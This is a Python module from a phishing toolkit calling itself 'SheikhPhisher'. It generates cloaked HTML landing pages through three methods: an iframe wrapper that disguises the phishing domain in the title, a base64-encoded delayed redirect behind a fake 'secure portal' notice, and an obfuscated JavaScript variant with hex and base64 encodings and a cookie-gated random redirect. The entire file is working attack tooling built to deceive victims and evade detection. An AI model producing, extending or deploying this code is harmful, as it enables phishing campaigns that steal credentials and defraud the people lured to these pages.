#!/usr/bin/env python3
# payloads/html_cloaker.py - SheikhPhisher HTML Cloaking Engine
# Generate cloaked landing pages with multiple evasion layers

import os, base64, json, logging, random, string
from urllib.parse import quote

log = logging.getLogger(__name__)

class HTMLCloaker:
    """Generate obfuscated/cloaked HTML payloads for phishing delivery"""
    
    CLOAK_METHODS = ['redirect', 'iframe', 'webpack', 'none']
    
    @staticmethod
    def generate(page_url, method='iframe', output=None):
        """Generate a cloaked HTML page"""
        if method == 'redirect':
            html = HTMLCloaker._redirect_cloak(page_url)
        elif method == 'iframe':
            html = HTMLCloaker._iframe_cloak(page_url)
        elif method == 'webpack':
            html = HTMLCloaker._webpack_cloak(page_url)
        else:
            html = f'<meta http-equiv="refresh" content="0;url={page_url}">'
        
        if output:
            os.makedirs(os.path.dirname(output) or '.', exist_ok=True)
            with open(output, 'w') as f:
                f.write(html)
            log.info(f"[CLOAK] Saved to {output}")
        
        return html
    
    @staticmethod
    def _iframe_cloak(page_url):
        """Load target in iframe - looks like legit domain"""
        domain = page_url.split('//')[1].split('/')[0] if '//' in page_url else page_url
        return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title>
<style>body{{margin:0;overflow:hidden;background:#fff}}iframe{{width:100vw;height:100vh;border:none;position:fixed;top:0;left:0}}</style>
</head>
<body>
    <iframe src="{page_url}" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
    <script>
        // Hide iframe URL in address bar
        if(window.top !== window.self) {{
            // Already framed, do nothing
        }}
        // Try to hide the phishing domain
        document.title = "{domain}";
    </script>
</body></html>'''
    
    @staticmethod
    def _redirect_cloak(page_url):
        """Redirect after delay with JS obfuscation"""
        encoded = base64.b64encode(page_url.encode()).decode()
        return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Please wait...</title>
<style>body{{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;color:#333}}h2{{font-weight:400}}h2 span{{animation:blink 1s infinite}}@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:0}}}}</style>
</head>
<body>
    <h2>Redirecting you to <span>secure</span> portal...</h2>
    <script>
        (function(){{
            var _0x4b7f=["{encoded}"];
            var _0x3a2c=function(_0x1234){{return atob(_0x1234);}};
            setTimeout(function(){{
                window.location.href=_0x3a2c(_0x4b7f[0]);
            }}, 2000);
        }})();
    </script>
</body></html>'''
    
    @staticmethod
    def _webpack_cloak(page_url):
        """Advanced obfuscation with polyglot technique"""
        # Embed URL in multiple locations
        b64_url = base64.b64encode(page_url.encode()).decode()
        hex_url = page_url.encode().hex()
        
        return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title>
<script>
// SheikhPhisher cloaked payload
var _ = [0x{hex_url[:8]},0x{hex_url[8:16] if len(hex_url)>16 else '00'},0x{hex_url[16:24] if len(hex_url)>24 else '00'}];
var __ = function(_0x1,_0x2){{return _0x1+_0x2;}};
var ___ = "\\x{hex_url[:2]}\\x{hex_url[2:4]}\\x{hex_url[4:6]}";
var ____ = atob("{b64_url}");
var _____ = function(){{return ____;}};
(function(){{
    var _0x=_____();
    if(document.cookie.indexOf('sp_visited')===-1){{
        document.cookie='sp_visited=1;path=/;max-age=3600';
        setTimeout(function(){{window.location.href=_0x;}}, Math.floor(Math.random()*1000)+500);
    }}else{{
        window.location.href=_0x;
    }}
}})();
</script>
</head>
<body><h1 style="display:none">.</h1></body></html>'''